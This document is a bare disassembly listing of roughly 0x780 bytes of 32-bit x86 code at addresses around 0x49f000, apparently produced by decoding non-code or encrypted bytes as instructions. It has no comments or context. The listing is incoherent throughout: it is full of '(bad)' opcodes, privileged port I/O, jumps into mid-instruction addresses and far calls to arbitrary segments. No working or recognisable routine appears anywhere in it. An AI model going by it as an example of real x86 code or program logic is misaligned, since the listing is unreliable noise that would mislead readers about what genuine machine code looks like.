  49f025:	nop
  49f026:	jecxz  0x49f04d
  49f028:	je     0x49f042
  49f02a:	int    0xc6
  49f02c:	add    eax,0xd883ce0b
  49f031:	shl    BYTE PTR [ecx],1
  49f033:	mov    eax,ds:0x8012e38f
  49f038:	mov    fs,WORD PTR [esi+0xc]
  49f03b:	xor    ecx,DWORD PTR [edi]
  49f03d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49f03e:	pop    ecx
  49f03f:	(bad)  
  49f041:	xchg   BYTE PTR [edx],ah
  49f043:	jns    0x49f08f
  49f045:	push   ebx
  49f046:	cmp    ch,ah
  49f048:	push   0x22148148
  49f04d:	hlt    
  49f04e:	cs inc esp
  49f050:	sbb    esi,edx
  49f052:	inc    esp
  49f053:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49f054:	in     eax,0x55
  49f056:	or     DWORD PTR ds:0xb9e074a8,esp
  49f05c:	pop    ds
  49f05d:	mov    cl,0x17
  49f05f:	jo     0x49f09c
  49f061:	ficom  WORD PTR [edi-0x43d17144]
  49f067:	xchg   DWORD PTR [bp+di-0x2d],esi
  49f06b:	ret    0x96d1
  49f06e:	ss dec esp
  49f070:	mov    DWORD PTR [ebp+0x593a1bda],ebx
  49f076:	dec    esi
  49f077:	and    al,0x53
  49f079:	sbb    DWORD PTR [ecx+eax*4-0x37],esi
  49f07d:	sub    al,0x2
  49f07f:	das    
  49f080:	pop    edi
  49f081:	loope  0x49f076
  49f083:	and    edi,esp
  49f085:	dec    esp
  49f086:	xchg   BYTE PTR [eax],cl
  49f088:	push   edi
  49f089:	push   0x9
  49f08b:	hlt    
  49f08c:	cmp    BYTE PTR ds:[ebx+0x6e964456],cl
  49f093:	je     0x49f0bb
  49f095:	cmp    ah,0xd2
  49f098:	and    DWORD PTR [esi],ecx
  49f09a:	add    ebp,DWORD PTR [ecx-0x77]
  49f09d:	jl     0x49f02d
  49f09f:	loope  0x49f051
  49f0a1:	dec    ebx
  49f0a2:	and    dl,dl
  49f0a4:	jns    0x49f0ac
  49f0a6:	mov    al,ds:0x2f7519cf
  49f0ab:	or     eax,0xb2077904
  49f0b0:	pop    ss
  49f0b1:	adc    BYTE PTR [esi+ecx*4+0x1f],0xe2
  49f0b6:	aaa    
  49f0b7:	cmp    edx,DWORD PTR [esi+0x4c]
  49f0ba:	jne    0x49f12d
  49f0bc:	mov    ecx,0x6ac82b80
  49f0c1:	inc    esp
  49f0c2:	out    0x5a,al
  49f0c4:	push   0xca8e80b4
  49f0c9:	or     BYTE PTR [edx-0x75],cl
  49f0cc:	clc    
  49f0cd:	xor    al,0x7d
  49f0cf:	jne    0x49f125
  49f0d1:	fldz   
  49f0d3:	ins    DWORD PTR es:[edi],dx
  49f0d4:	jbe    0x49f077
  49f0d6:	or     esp,edi
  49f0d8:	mov    ecx,edi
  49f0da:	shr    edi,0x28
  49f0dd:	adc    al,0x81
  49f0df:	iret   
  49f0e0:	pop    edx
  49f0e1:	mov    dh,0xd0
  49f0e3:	fcmovbe st,st(4)
  49f0e5:	lock aas 
  49f0e7:	ret    
  49f0e8:	cld    
  49f0e9:	fcomp  DWORD PTR [edx]
  49f0eb:	push   es
  49f0ec:	cs push eax
  49f0ee:	pop    edi
  49f0ef:	fsub   QWORD PTR ds:0x7e4a493c
  49f0f5:	dec    eax
  49f0f6:	xlat   BYTE PTR gs:[ebx]
  49f0f8:	loop   0x49f0f6
  49f0fa:	mov    DWORD PTR [ebp-0x8],edx
  49f0fd:	loop   0x49f0de
  49f0ff:	pop    ebx
  49f100:	push   esp
  49f101:	gs sub esi,0x0
  49f105:	je     0x49f0d7
  49f107:	dec    esi
  49f108:	je     0x49f0b2
  49f10a:	pop    es
  49f10b:	mov    WORD PTR [esi],cs
  49f10d:	je     0x49f11f
  49f10f:	fisttp DWORD PTR [esi]
  49f111:	push   DWORD PTR [ebx+0x1ccd8bea]
  49f117:	and    bl,ch
  49f119:	aaa    
  49f11a:	cmp    eax,0x60df440
  49f11f:	or     ecx,DWORD PTR [eax+0x6a]
  49f122:	repz jbe 0x49f163
  49f125:	push   edi
  49f126:	mov    edi,DWORD PTR [esi-0x5a508fdc]
  49f12c:	xchg   edi,eax
  49f12d:	add    eax,0xc0ca002d
  49f132:	pop    es
  49f133:	push   es
  49f134:	or     al,0xe6
  49f136:	rol    DWORD PTR [esi],0x15
  49f139:	adc    dl,BYTE PTR [edx]
  49f13b:	add    BYTE PTR es:[esi-0x2],dh
  49f13f:	daa    
  49f140:	mov    ah,0xf5
  49f142:	add    DWORD PTR [esi+0x70],0x86c685d7
  49f149:	mov    ds:0x1e4b1af0,eax
  49f14e:	push   0x815d4007
  49f153:	sahf   
  49f154:	ins    DWORD PTR es:[edi],dx
  49f155:	int    0x8b
  49f157:	mov    ebp,0x2f659d20
  49f15c:	mov    al,ds:0x5c32750b
  49f161:	mov    ds:0x1c7a24b7,eax
  49f166:	mov    ecx,DWORD PTR [esi+0x21688b5c]
  49f16c:	int3   
  49f16d:	mov    ebp,0x9e05cd87
  49f172:	(bad)  
  49f173:	push   ebp
  49f174:	add    DWORD PTR [eax-0x15],eax
  49f177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49f178:	shr    ch,1
  49f17a:	adc    ecx,DWORD PTR [ebx-0x7575b26a]
  49f180:	mov    DWORD PTR [edi],ebx
  49f182:	inc    edx
  49f183:	sbb    BYTE PTR [ecx+0x2060add8],bl
  49f189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49f18a:	or     DWORD PTR [esi+0x13],ecx
  49f18d:	in     al,dx
  49f18e:	push   eax
  49f18f:	pop    eax
  49f190:	es xchg esi,eax
  49f192:	push   edx
  49f193:	inc    esp
  49f194:	rcl    DWORD PTR [esi+0x60b232cb],cl
  49f19a:	imul   ecx,DWORD PTR [edx+0x4cec5342],0xfffffff9
  49f1a1:	jno    0x49f131
  49f1a3:	jl     0x49f208
  49f1a5:	mov    BYTE PTR [esi+edi*2],dl
  49f1a8:	dec    edi
  49f1a9:	nop
  49f1aa:	out    0x82,al
  49f1ac:	test   DWORD PTR [ecx+0x203f5bbe],0xa60a6458
  49f1b6:	mov    dh,0xa7
  49f1b8:	or     BYTE PTR [ebx],dl
  49f1ba:	cmp    dl,dl
  49f1bc:	ret    0x614c
  49f1bf:	or     ebx,edx
  49f1c1:	and    al,0x5c
  49f1c3:	xor    BYTE PTR [edx*4-0x9a749b9],0x56
  49f1cb:	out    dx,al
  49f1cc:	enter  0x850,0x31
  49f1d0:	xchg   ecx,eax
  49f1d1:	fdivr  DWORD PTR [esi+0x39]
  49f1d4:	imul   ecx,DWORD PTR [eax-0x760eeef0],0xc8e410be
  49f1de:	in     eax,dx
  49f1df:	scas   al,BYTE PTR es:[edi]
  49f1e0:	and    ebx,eax
  49f1e2:	sahf   
  49f1e3:	pop    esp
  49f1e4:	jne    0x49f257
  49f1e6:	mov    al,0xa4
  49f1e8:	adc    al,BYTE PTR [ebp+0x13dc113a]
  49f1ee:	in     al,0x2a
  49f1f0:	cli    
  49f1f1:	or     eax,0x30a8d3d9
  49f1f6:	inc    ebp
  49f1f7:	shr    BYTE PTR [edi],0x76
  49f1fa:	adc    ah,dh
  49f1fc:	sub    al,0x5
  49f1fe:	mov    al,0x1e
  49f200:	sub    DWORD PTR [ebp+0x9145171],eax
  49f206:	mov    DWORD PTR [esi],ebp
  49f208:	xchg   esp,eax
  49f209:	mov    es,WORD PTR [ebx+eax*1+0x43526a54]
  49f210:	mov    dh,ah
  49f212:	mov    ch,bl
  49f214:	xor    BYTE PTR [ebp+0x4b],0x18
  49f218:	adc    al,0x84
  49f21a:	push   edx
  49f21b:	sub    BYTE PTR [eax],bl
  49f21d:	test   eax,0x2dfce120
  49f222:	fs mov ah,0x9b
  49f225:	lods   eax,DWORD PTR ds:[esi]
  49f226:	stos   BYTE PTR es:[edi],al
  49f227:	cld    
  49f228:	push   es
  49f229:	push   ebp
  49f22a:	std    
  49f22b:	inc    ebp
  49f22c:	inc    BYTE PTR [ebx-0x620ef794]
  49f232:	mov    edx,0xff2049e7
  49f237:	adc    eax,ecx
  49f239:	mov    dh,0x21
  49f23b:	mov    DWORD PTR [ecx*1-0x78e3e398],esp
  49f242:	push   ecx
  49f243:	popf   
  49f244:	clc    
  49f245:	clc    
  49f246:	ret    0x6d08
  49f249:	fucomi st,st(7)
  49f24b:	mov    gs,WORD PTR [ebp+0x5c10c1d5]
  49f251:	dec    eax
  49f252:	mov    al,0x3c
  49f254:	push   esi
  49f255:	ret    0x848e
  49f258:	ror    DWORD PTR [eax],1
  49f25a:	xor    BYTE PTR [ecx+0x7e],cl
  49f25d:	sub    eax,0xa7685222
  49f262:	and    al,0x96
  49f264:	scas   al,BYTE PTR es:[edi]
  49f265:	add    al,0x50
  49f267:	xor    edi,esi
  49f269:	sbb    DWORD PTR ds:0xf7e6becc,ebx
  49f26f:	test   BYTE PTR [edi-0x75],0xf2
  49f273:	push   0x34be3605
  49f278:	sbb    al,0xb9
  49f27a:	icebp  
  49f27b:	mov    ecx,edx
  49f27d:	cmp    bl,cl
  49f27f:	lock les ebp,FWORD PTR [ebx+0x30a7671]
  49f286:	into   
  49f287:	pop    edi
  49f288:	mov    DWORD PTR [ecx+0x3e],esi
  49f28b:	inc    eax
  49f28c:	clc    
  49f28d:	test   edi,edx
  49f28f:	mov    ds:0xab4a7540,eax
  49f294:	mov    eax,0xea854dff
  49f299:	adc    edx,DWORD PTR [edi-0x46]
  49f29c:	stc    
  49f29d:	pop    esp
  49f29e:	push   ds
  49f29f:	xor    edi,ecx
  49f2a1:	imul   edi,edi,0x6c078965
  49f2a7:	pusha  
  49f2a8:	sbb    DWORD PTR [edx+0x4b],esp
  49f2ab:	sahf   
  49f2ac:	xchg   edx,eax
  49f2ad:	push   ss
  49f2ae:	ins    DWORD PTR es:[edi],dx
  49f2af:	outs   dx,DWORD PTR ds:[esi]
  49f2b0:	iret   
  49f2b1:	inc    edx
  49f2b2:	cmp    eax,0x7c3a7efc
  49f2b7:	loope  0x49f279
  49f2b9:	pop    esp
  49f2ba:	and    ah,al
  49f2bc:	in     eax,0x13
  49f2be:	lock out dx,al
  49f2c0:	(bad)  
  49f2c1:	adc    BYTE PTR [edi+0x5f],bh
  49f2c4:	cli    
  49f2c5:	xor    eax,0xdd417440
  49f2ca:	out    dx,al
  49f2cb:	sbb    cl,bl
  49f2cd:	rcl    BYTE PTR [ebx+0x50],0x2
  49f2d1:	inc    eax
  49f2d2:	stos   DWORD PTR es:[edi],eax
  49f2d3:	cmp    dl,BYTE PTR [esi+0xa]
  49f2d6:	push   edi
  49f2d7:	iret   
  49f2d8:	loop   0x49f2ac
  49f2da:	ret    0xff7
  49f2dd:	mov    ecx,eax
  49f2df:	inc    esi
  49f2e0:	fld    st(1)
  49f2e2:	std    
  49f2e3:	in     al,dx
  49f2e4:	xchg   ebp,eax
  49f2e5:	test   DWORD PTR [ecx],0xc9b32885
  49f2eb:	fst    QWORD PTR [ebp-0x18]
  49f2ee:	push   esi
  49f2ef:	or     BYTE PTR [ebx],0x78
  49f2f2:	mov    dh,0x62
  49f2f4:	mov    dl,0xbc
  49f2f6:	ficom  DWORD PTR ds:0x12529434
  49f2fc:	fild   QWORD PTR [ebp+0x8]
  49f2ff:	sub    dh,al
  49f301:	or     ebx,DWORD PTR [ebp+0x3d]
  49f304:	(bad)  [eax+ebx*8]
  49f307:	fiadd  DWORD PTR [ecx+0x51467a05]
  49f30d:	inc    BYTE PTR [ecx-0xbfc8250]
  49f313:	jne    0x49f2e7
  49f315:	pop    ebp
  49f316:	clc    
  49f317:	sbb    DWORD PTR [ebx+ecx*4+0x2bfcbfc6],edi
  49f31e:	retf   0xc31b
  49f321:	sub    ecx,0xa
  49f324:	sub    BYTE PTR [ebx],0xfa
  49f327:	sbb    esi,ebx
  49f329:	xchg   ebp,eax
  49f32a:	test   BYTE PTR [edx-0x5fab6600],cl
  49f330:	stc    
  49f331:	sbb    al,0x68
  49f333:	sub    al,0xc4
  49f335:	jb     0x49f385
  49f337:	rol    BYTE PTR [ecx],0x45
  49f33a:	push   ss
  49f33b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49f33c:	dec    edx
  49f33d:	test   eax,0x92ab8f6b
  49f342:	mov    ecx,DWORD PTR [esi-0x62]
  49f345:	mov    dh,0xd2
  49f347:	jne    0x49f2f7
  49f349:	test   esi,ecx
  49f34b:	sbb    eax,edx
  49f34d:	(bad)  
  49f34e:	daa    
  49f34f:	push   ebx
  49f350:	retf   
  49f351:	sti    
  49f352:	mov    ah,0x1b
  49f354:	repnz mov cl,BYTE PTR [esi]
  49f357:	in     al,dx
  49f358:	ror    DWORD PTR [edx+ebp*1],0x58
  49f35c:	cwde   
  49f35d:	dec    esi
  49f35e:	mov    DWORD PTR [edi+0x30],esp
  49f361:	imul   eax,ecx,0xdd5e245f
  49f367:	es mov eax,0x860041d
  49f36d:	and    BYTE PTR [ebx+0x1d6276a],0xe2
  49f374:	cli    
  49f375:	mov    ch,0x69
  49f377:	and    eax,0xa18949c
  49f37c:	loope  0x49f382
  49f37e:	mov    al,ds:0xa702c5a
  49f383:	mov    eax,DWORD PTR [eax+0x3878a9a2]
  49f389:	jno    0x49f376
  49f38b:	int3   
  49f38c:	xor    BYTE PTR [edi],dl
  49f38e:	jg     0x49f3d0
  49f390:	inc    esp
  49f391:	mov    BYTE PTR [eax],cl
  49f393:	xchg   DWORD PTR [edx],edx
  49f395:	add    DWORD PTR [ebx+0x532ff8b5],eax
  49f39b:	sub    eax,0x19874060
  49f3a0:	dec    ebx
  49f3a1:	retf   
  49f3a2:	xor    BYTE PTR [edx],bl
  49f3a4:	ja     0x49f3af
  49f3a6:	jne    0x49f3b4
  49f3a8:	es xchg esi,eax
  49f3aa:	adc    DWORD PTR [ebp+0xc],edi
  49f3ad:	cmp    eax,0x32ef24f5
  49f3b2:	rol    BYTE PTR [ebp-0x70],0xf4
  49f3b6:	jo     0x49f3db
  49f3b8:	retf   0x3a28
  49f3bb:	int3   
  49f3bc:	push   ss
  49f3bd:	jle    0x49f43b
  49f3bf:	cmp    eax,0x383f06dd
  49f3c4:	adc    al,BYTE PTR [edi]
  49f3c6:	or     ebp,eax
  49f3c8:	popa   
  49f3c9:	xor    BYTE PTR [ebx-0x7cd77839],ah
  49f3cf:	lea    eax,[esp+ecx*8+0xf0be33a]
  49f3d6:	adc    BYTE PTR [eax+0x20],dl
  49f3d9:	outs   dx,BYTE PTR ds:[esi]
  49f3da:	scas   eax,DWORD PTR es:[edi]
  49f3db:	add    dh,BYTE PTR [ecx+0x6c]
  49f3de:	xchg   edx,eax
  49f3df:	push   es
  49f3e0:	mov    ch,0x67
  49f3e2:	jmp    0x49f3bc
  49f3e4:	rol    BYTE PTR [edi+0x70c1680],0x18
  49f3eb:	jmp    0xaeb:0xc89c1f50
  49f3f2:	fcom   QWORD PTR [ebx+eiz*4-0x5f]
  49f3f6:	push   0x48
  49f3f8:	add    dl,BYTE PTR [eax-0x4cafdc90]
  49f3fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49f3ff:	mov    ch,0x48
  49f401:	clc    
  49f402:	or     ecx,DWORD PTR [edx+0x78]
  49f405:	add    BYTE PTR [ebx],0x46
  49f408:	call   0xd29d:0xa100d10
  49f40f:	lar    ecx,WORD PTR [eax+0x42f03439]
  49f416:	mov    edx,0x20041f
  49f41b:	sub    al,0xe9
  49f41d:	sub    bl,ch
  49f41f:	scas   al,BYTE PTR es:[edi]
  49f420:	(bad)  
  49f421:	sar    BYTE PTR [edi],1
  49f423:	add    esi,edx
  49f425:	or     al,0xf3
  49f427:	adc    ebx,esp
  49f429:	push   es
  49f42a:	jne    0x49f432
  49f42c:	push   ebp
  49f42d:	push   0xffffffac
  49f42f:	xchg   esp,eax
  49f430:	fsubr  QWORD PTR [edi]
  49f432:	or     al,0x65
  49f434:	(bad)  
  49f435:	mov    dl,0xd0
  49f437:	aam    0xfa
  49f439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49f43a:	sub    BYTE PTR [edx-0x79cff987],0xcd
  49f441:	add    eax,0xf9b86485
  49f446:	test   eax,0x7c204048
  49f44b:	or     al,0x2f
  49f44d:	jg     0x49f455
  49f44f:	jno    0x49f472
  49f451:	xchg   edi,eax
  49f452:	mov    DWORD PTR ds:0x1f104367,edi
  49f458:	and    DWORD PTR [ebp-0x7a35e76e],ebx
  49f45e:	cvtps2pd xmm5,QWORD PTR [ebx]
  49f461:	mov    ecx,0x5a3f305c
  49f466:	xchg   esp,eax
  49f467:	adc    edi,DWORD PTR [edx+0x585e0533]
  49f46d:	push   eax
  49f46e:	adc    al,bl
  49f470:	cmp    DWORD PTR [eax+0x7501cf2],0x5000fa43
  49f47a:	or     ah,BYTE PTR [edi+0x13]
  49f47d:	dec    esi
  49f47e:	push   esi
  49f47f:	ror    BYTE PTR [eax+0x23],cl
  49f482:	outs   dx,BYTE PTR ds:[esi]
  49f483:	fsub   st(2),st
  49f485:	inc    eax
  49f486:	cmp    eax,0x70d010a3
  49f48b:	lahf   
  49f48c:	imul   BYTE PTR [eax+0x48e1a10f]
  49f492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49f493:	push   ss
  49f494:	sbb    bl,bl
  49f496:	popa   
  49f497:	inc    edx
  49f498:	popa   
  49f499:	or     bl,BYTE PTR [ebp+0x14]
  49f49c:	add    BYTE PTR [eax-0x248356f8],bl
  49f4a2:	dec    edx
  49f4a3:	and    eax,0x21100465
  49f4a8:	test   BYTE PTR [edx+ebx*2+0x3e],dl
  49f4ac:	add    cl,BYTE PTR [eax]
  49f4ae:	test   DWORD PTR [ebp+0x66dcd72d],edx
  49f4b4:	or     BYTE PTR [esi+0x4104e169],ah
  49f4ba:	add    al,0x10
  49f4bc:	adc    al,0xeb
  49f4be:	fisttp WORD PTR [ebx+ecx*1+0x4f]
  49f4c2:	dec    eax
  49f4c3:	and    al,0x66
  49f4c5:	mov    DWORD PTR [eax+0x2],edx
  49f4c8:	ficomp WORD PTR [edi+0x0]
  49f4cb:	xor    BYTE PTR [eax+eax*8+0x5],0x83
  49f4d0:	leave  
  49f4d1:	push   es
  49f4d2:	mov    DWORD PTR [esi-0x29ea5bf0],esp
  49f4d8:	xchg   edx,eax
  49f4d9:	cmp    al,0xaa
  49f4db:	add    ebx,0xc0494600
  49f4e1:	mov    eax,0xc00d0170
  49f4e6:	add    DWORD PTR [eax],ebp
  49f4e8:	add    DWORD PTR [ebp+0x6c],edi
  49f4eb:	jbe    0x49f490
  49f4ed:	cmp    eax,0xf62c7e80
  49f4f2:	pop    edx
  49f4f3:	clc    
  49f4f4:	xor    BYTE PTR [esi+eax*2],ah
  49f4f7:	dec    eax
  49f4f8:	and    edi,0x8d4a26f7
  49f4fe:	dec    esi
  49f4ff:	push   0x78560a51
  49f504:	push   edx
  49f505:	xchg   ch,ah
  49f507:	cmp    ebx,DWORD PTR [edi-0x71ef124b]
  49f50d:	cwde   
  49f50e:	das    
  49f50f:	pop    eax
  49f510:	out    0x75,eax
  49f512:	xor    cl,al
  49f514:	test   al,0xb8
  49f516:	xchg   esi,eax
  49f517:	xlat   BYTE PTR ds:[ebx]
  49f518:	xor    al,0x2f
  49f51a:	pop    ecx
  49f51b:	clc    
  49f51c:	data16 mov ds:0x7745fe6,al
  49f522:	mov    BYTE PTR ds:0x4834d00d,0x45
  49f529:	pop    esi
  49f52a:	pop    ds
  49f52b:	int    0x76
  49f52d:	push   cs
  49f52e:	daa    
  49f52f:	sub    al,0x3c
  49f531:	push   ecx
  49f532:	in     al,0x80
  49f534:	or     ah,BYTE PTR [eax]
  49f536:	aad    0x14
  49f538:	pop    edx
  49f539:	loop   0x49f5af
  49f53b:	and    DWORD PTR [ecx],edx
  49f53d:	adc    al,0xe7
  49f53f:	add    BYTE PTR [ecx-0x661e73ef],ah
  49f545:	stc    
  49f546:	ins    DWORD PTR es:[edi],dx
  49f547:	outs   dx,DWORD PTR ds:[esi]
  49f548:	(bad)
  49f54c:	dec    ebp
  49f54d:	mov    eax,0x8891103
  49f552:	add    ch,0xb
  49f555:	ins    BYTE PTR es:[edi],dx
  49f556:	rcr    BYTE PTR [eax+0x75],1
  49f559:	cs sub eax,0xd37ec627
  49f55f:	adc    DWORD PTR [eax],esp
  49f561:	pop    esi
  49f562:	and    BYTE PTR [esi],ch
  49f564:	nop
  49f565:	mov    ecx,DWORD PTR [esi*8-0x6f7edbd8]
  49f56c:	inc    esi
  49f56d:	add    eax,0x7071324
  49f572:	outs   dx,BYTE PTR ds:[esi]
  49f573:	adc    al,BYTE PTR [ecx+0x7c0d8012]
  49f579:	jecxz  0x49f52d
  49f57b:	fwait
  49f57c:	lods   al,BYTE PTR ds:[esi]
  49f57d:	push   es
  49f57e:	pop    esp
  49f57f:	push   es
  49f580:	mov    ?,eax
  49f582:	sbb    ah,dl
  49f584:	cmc    
  49f585:	sub    al,0x6
  49f587:	pusha  
  49f588:	push   cs
  49f589:	jl     0x49f5db
  49f58b:	mov    DWORD PTR [edi],eax
  49f58d:	sti    
  49f58e:	sbb    BYTE PTR [ebx],ah
  49f590:	loope  0x49f601
  49f592:	test   al,0xe7
  49f594:	or     BYTE PTR [eax-0x2],0xa4
  49f598:	xor    eax,0x3d287e83
  49f59d:	adc    ch,BYTE PTR [ebx]
  49f59f:	mov    ds:0xcb7e2f32,al
  49f5a4:	stos   BYTE PTR es:[edi],al
  49f5a5:	sbb    al,0x75
  49f5a7:	ja     0x49f5a9
  49f5a9:	pop    edi
  49f5aa:	mov    eax,0xe003860b
  49f5af:	sub    cl,bl
  49f5b1:	fnstcw WORD PTR [ecx+0x2]
  49f5b4:	bound  eax,QWORD PTR [esp+edx*1]
  49f5b7:	xchg   esp,eax
  49f5b8:	xchg   edx,eax
  49f5b9:	xor    BYTE PTR [eax+ecx*8+0x57442fed],0x0
  49f5c1:	pop    es
  49f5c2:	pop    ecx
  49f5c3:	std    
  49f5c4:	scas   al,BYTE PTR es:[edi]
  49f5c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49f5c6:	inc    ebx
  49f5c7:	inc    esp
  49f5c8:	xor    al,0xc
  49f5ca:	fst    QWORD PTR [ecx-0x51]
  49f5cd:	loopne 0x49f62d
  49f5cf:	push   ebx
  49f5d0:	adc    BYTE PTR [ecx+0x3c740e75],dh
  49f5d6:	cdq    
  49f5d7:	rcl    BYTE PTR [edx+0x1f],0x13
  49f5db:	sbb    al,0x24
  49f5dd:	and    al,0x81
  49f5df:	add    esp,esp
  49f5e1:	inc    esi
  49f5e2:	aaa    
  49f5e3:	or     al,0xc5
  49f5e5:	rol    eax,cl
  49f5e7:	or     BYTE PTR [esi],al
  49f5e9:	shr    BYTE PTR [esi+0x67010f58],0x50
  49f5f0:	xchg   edx,eax
  49f5f1:	adc    dh,BYTE PTR [eax]
  49f5f3:	rol    eax,1
  49f5f5:	scas   al,BYTE PTR es:[edi]
  49f5f6:	add    ch,BYTE PTR [ecx-0x39]
  49f5f9:	adc    al,0x59
  49f5fb:	pop    eax
  49f5fc:	cdq    
  49f5fd:	adc    ch,al
  49f5ff:	xchg   edx,eax
  49f600:	push   esi
  49f601:	add    eax,0x52220c70
  49f606:	adc    DWORD PTR [ecx+0x67],0xffffffc2
  49f60a:	xchg   ebp,edx
  49f60c:	push   0x99c94634
  49f611:	nop
  49f612:	paddw  mm3,QWORD PTR [edi+edi*1-0x70]
  49f617:	mov    WORD PTR [ebx+edx*1+0x2b],?
  49f61b:	retf   0x27b6
  49f61e:	idiv   esi
  49f620:	mov    esp,0x1cf89002
  49f625:	add    al,0x2b
  49f627:	repnz sbb al,0xc2
  49f62a:	and    DWORD PTR [ecx+eax*1-0x3c],esi
  49f62e:	adc    BYTE PTR ds:0xce04f009,dh
  49f634:	sbb    BYTE PTR [edi],dh
  49f636:	lock or BYTE PTR [ebx],bl
  49f639:	enter  0x3581,0xd3
  49f63d:	cli    
  49f63e:	add    bh,bh
  49f640:	push   ebx
  49f641:	mov    ds:0x343c6978,eax
  49f646:	cmp    eax,DWORD PTR [esp]
  49f649:	xor    ecx,ecx
  49f64b:	ret    0x5058
  49f64e:	shl    DWORD PTR [ecx+0x36],0x4b
  49f652:	mov    ds:0x6f573015,eax
  49f657:	test   eax,0x2690435
  49f65c:	test   eax,0x46c456d4
  49f661:	push   ebx
  49f662:	cmp    BYTE PTR [eax],bl
  49f664:	lods   eax,DWORD PTR ds:[esi]
  49f665:	sbb    BYTE PTR [edi],al
  49f667:	add    BYTE PTR [ebx],0x70
  49f66a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49f66b:	(bad)  
  49f66c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49f66d:	push   edx
  49f66e:	fs add eax,0xbbc61d16
  49f674:	nop
  49f675:	mov    ecx,0x8bcc53e0
  49f67a:	test   DWORD PTR [esi+0x2d],edx
  49f67d:	add    esi,edx
  49f67f:	jl     0x49f68b
  49f681:	(bad)  
  49f682:	and    DWORD PTR [eax],eax
  49f684:	inc    esi
  49f685:	and    edx,DWORD PTR [ecx-0x80]
  49f688:	or     ch,BYTE PTR [ecx-0x53]
  49f68b:	and    eax,0x807d50e5
  49f690:	popf   
  49f691:	xor    al,0xd
  49f693:	jne    0x49f707
  49f695:	mov    edi,0x8157140c
  49f69a:	adc    DWORD PTR [ebx+esi*4],ebp
  49f69d:	sbb    BYTE PTR ds:[edx],ah
  49f6a0:	lock push eax
  49f6a2:	nop
  49f6a3:	clc    
  49f6a4:	sbb    BYTE PTR [edi],0x2f
  49f6a7:	cwde   
  49f6a8:	jb     0x49f64c
  49f6aa:	mov    WORD PTR [ebx-0x77],?
  49f6ad:	inc    esi
  49f6ae:	dec    edi
  49f6af:	call   0x93c176ba
  49f6b4:	xor    eax,0x69c0444c
  49f6b9:	add    BYTE PTR [edi+eax*2-0x7f3bf6fa],ch
  49f6c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49f6c1:	push   cs
  49f6c2:	test   al,0x33
  49f6c4:	fcomp  QWORD PTR [eax]
  49f6c6:	ror    BYTE PTR [ebp-0x4],0x37
  49f6ca:	lea    esi,[esi+ebx*2+0x4e]
  49f6ce:	sbb    al,al
  49f6d0:	pop    ss
  49f6d1:	mov    al,ds:0x147b075b
  49f6d6:	push   es
  49f6d7:	arpl   WORD PTR [edi+0x226ae41],bx
  49f6dd:	pop    edi
  49f6de:	clc    
  49f6df:	add    al,0x47
  49f6e1:	add    bl,bh
  49f6e3:	sub    esp,DWORD PTR [eax+eiz*2+0x61]
  49f6e7:	xor    al,BYTE PTR [ebx-0xff9a03a]
  49f6ed:	pop    ss
  49f6ee:	test   eax,0x348df620
  49f6f3:	pop    esi
  49f6f4:	fcmove st,st(1)
  49f6f6:	xor    dl,BYTE PTR [edi+0x5d]
  49f6f9:	add    ch,dh
  49f6fb:	jmp    0xacc15764
  49f700:	scas   al,BYTE PTR es:[edi]
  49f701:	pop    esp
  49f702:	sbb    eax,DWORD PTR [ecx+esi*8]
  49f705:	push   edi
  49f706:	fs pusha 
  49f708:	(bad)  [ebx]
  49f70a:	add    esi,ebx
  49f70c:	or     bl,BYTE PTR gs:[ebp+0x28]
  49f710:	dec    esi
  49f711:	(bad)  [ecx+0x2b]
  49f714:	bound  ebx,QWORD PTR [esi+ebp*2+0x69]
  49f718:	mov    bl,0x61
  49f71a:	jl     0x49f726
  49f71c:	push   cs
  49f71d:	pop    edi
  49f71e:	inc    ebx
  49f71f:	adc    al,0x8f
  49f721:	pop    ecx
  49f722:	push   edi
  49f723:	push   edi
  49f724:	ret    
  49f725:	popa   
  49f726:	jle    0x49f74b
  49f728:	push   es
  49f729:	mov    esi,0xf406ae00
  49f72e:	sar    edx,0x10
  49f731:	mov    ds:0xa7e0e6c1,eax
  49f736:	mov    eax,0xbe210d2
  49f73b:	(bad)  
  49f73c:	and    eax,0x89d00c6a
  49f741:	adc    DWORD PTR [ebp-0x1e],eax
  49f744:	or     DWORD PTR [edi+0x23],edx
  49f747:	or     al,0xfd
  49f749:	mov    ch,0x3e
  49f74b:	add    al,0xe2
  49f74d:	mov    edx,0xb0a23e1c
  49f752:	arpl   WORD PTR [edi+0x48779000],ax
  49f758:	push   cs
  49f759:	pop    edi
  49f75a:	add    ebp,edx
  49f75c:	les    ecx,FWORD PTR [edi]
  49f75e:	sub    ah,0xc7
  49f761:	jle    0x49f797
  49f763:	jg     0x49f78d
  49f765:	push   esp
  49f766:	ret    0xea5
  49f769:	push   edx
  49f76a:	pop    ss
  49f76b:	dec    ecx
  49f76c:	in     al,dx
  49f76d:	xchg   edx,eax
  49f76e:	cmc    
  49f76f:	sbb    al,0x99
  49f771:	xchg   edi,eax
  49f772:	clc    
  49f773:	fild   WORD PTR [esi-0x5ba34464]
  49f779:	fimul  DWORD PTR [eax]
  49f77b:	inc    edi
  49f77c:	shl    ebx,0x51
  49f77f:	gs leave 
  49f781:	mov    WORD PTR [edx],es
  49f783:	fs mov esp,ss
  49f786:	jp     0x49f70a
  49f788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49f789:	shl    BYTE PTR [esi],0x3c
  49f78c:	pop    esi
  49f78d:	cmp    cl,BYTE PTR [edi]
  49f78f:	pusha  
  49f790:	sbb    BYTE PTR [esi],bl
  49f792:	sub    eax,0xb35333e1
  49f797:	dec    eax
  49f798:	inc    ebp
  49f799:	xor    BYTE PTR [ebx+0x7c],cl
  49f79c:	cmp    edi,DWORD PTR [edi-0x2]
  49f79f:	push   esp
  49f7a0:	ds fucomi st,st(5)
